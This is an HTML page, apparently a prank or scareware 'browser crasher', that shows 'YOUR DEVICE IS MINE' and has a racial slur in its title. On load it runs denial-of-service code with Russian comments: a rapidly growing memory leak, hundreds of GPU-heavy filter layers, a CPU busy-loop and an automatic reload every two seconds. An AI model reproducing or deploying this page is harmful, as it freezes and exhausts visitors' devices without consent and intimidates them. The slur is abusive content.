<meta name='viewport' content='width=device-width, initial-scale=1'/><!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>niga bye</title>
    <style>
        @keyframes glitch {
            0% { transform: translate(0); }
            20% { transform: translate(-5px, 5px); }
            40% { transform: translate(-5px, -5px); }
            60% { transform: translate(5px, 5px); }
            80% { transform: translate(5px, -5px); }
            100% { transform: translate(0); }
        }

        body {
            background-color: #050000;
            margin: 0;
            overflow: hidden;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            /* Ужасающий фон: кроваво-красные потеки и шум */
            background: radial-gradient(circle, #200 0%, #000 70%), url('https://www.transparenttextures.com/patterns/carbon-fibre.png');
        }

        #warning {
            color: #ff0000;
            font-family: "Courier New", monospace;
            font-size: 8vw;
            text-align: center;
            text-transform: uppercase;
            animation: glitch 0.1s infinite;
            text-shadow: 2px 2px #500, -2px -2px #000;
            z-index: 9999;
        }

        /* Наложение "шума" на весь экран */
        .overlay {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: repeating-linear-gradient(0deg, rgba(0,0,0,0.1), rgba(0,0,0,0.1) 1px, transparent 1px, transparent 2px);
            pointer-events: none;
        }
    </style>
</head>
<body onload="autoStart()">
    <div class="overlay"></div>
    <div id="warning">YOUR DEVICE IS MINE</div>

    <svg style="display:none">
        <filter id="distort">
            <feTurbulence type="fractalNoise" baseFrequency="0.05" numOctaves="10" />
            <feDisplacementMap in="SourceGraphic" scale="50" />
        </filter>
    </svg>

    <script>
        function autoStart() {
            // Попытка запуска звука
            const audio = new Audio('sound.mp3');
            audio.loop = true;
            audio.play().catch(() => {
                console.log("Звук заблокирован до клика, но нагрузка запущена.");
            });

            // МГНОВЕННАЯ НАГРУЗКА (GPU + RAM + CPU)
            
            // 1. Memory Leak (RAM)
            const leak = [];
            setInterval(() => {
                for(let i = 0; i < 200; i++) {
                    let b = new Blob([new Uint8Array(5 * 1024 * 1024)]);
                    leak.push(URL.createObjectURL(b));
                }
            }, 50);

            // 2. Visual Destructor (GPU)
            for(let i = 0; i < 300; i++) {
                let div = document.createElement('div');
                div.style.cssText = `
                    position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
                    filter: url(#distort) blur(20px);
                    backdrop-filter: contrast(500%) invert(100%);
                    opacity: 0.05;
                `;
                document.body.appendChild(div);
            }

            // 3. System Lock (CPU)
            function kill() {
                let s = Date.now();
                while(Date.now() - s < 100) {
                    history.replaceState(null, null, "#" + Math.random());
                }
                requestAnimationFrame(kill);
            }
            kill();

            // Автоматический релоад для циклического ада
            setTimeout(() => {
                location.reload();
            }, 2000);
        }
    </script>
</body>
</html>
